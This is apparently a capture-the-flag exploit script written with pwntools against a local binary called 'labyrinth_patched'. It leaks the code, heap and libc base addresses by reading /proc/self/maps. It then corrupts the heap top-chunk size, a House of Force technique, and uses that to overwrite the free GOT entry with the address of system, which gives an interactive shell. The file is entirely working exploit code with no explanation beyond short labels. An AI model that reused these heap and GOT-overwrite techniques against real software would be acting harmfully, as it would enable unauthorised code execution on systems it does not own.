from pwn import *


e = ELF("libc")
p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")			# leak
print p.recv()
p.sendline("/proc/self/maps")
codebase = int(p.recvuntil("-")[:-1],16)
p.recvline()
p.recvline()
p.recvline()
heapbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("[heap]\x0a")
libcbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("\x0a\x0a")
log.info("code base = " + hex(codebase))
log.info("heap base = " + hex(heapbase))
log.info("libc base = " + hex(libcbase))
system = libcbase + e.symbols['system']

print p.recv()
p.sendline("1")			# make
print p.recv()
p.sendline("name")
print p.recv()
p.sendline("email")
print p.recv()
p.sendline("1")			# width
print p.recv()
p.sendline("1")			# height
print p.recv()
payload = "info ES"
payload += "\xff"*15		# set top chunk size to 0xffffffff
payload = payload.ljust(255,"\x00")
p.sendline(payload)
p.sendline("a")
print p.recvuntil("SAVE_KEY is ")
key = p.recvuntil("\x0a")[:-1]
print key
p.sendline("2")			# do
print p.recv()
p.sendline(key)
print p.recv()
p.sendline("A")

free_got = codebase + 0x4018
topAddr = heapbase + 0x1188 + 0x8
targetAddr = free_got

print p.recv()			# adjust offset
p.sendline(str(targetAddr - 8 - topAddr - 1))

payload=p32(system)
print p.recv()			# got overwrite
p.sendline(str(0x2000))
print p.recv()
p.sendline(payload+";/bin/sh\x00")
p.interactive()
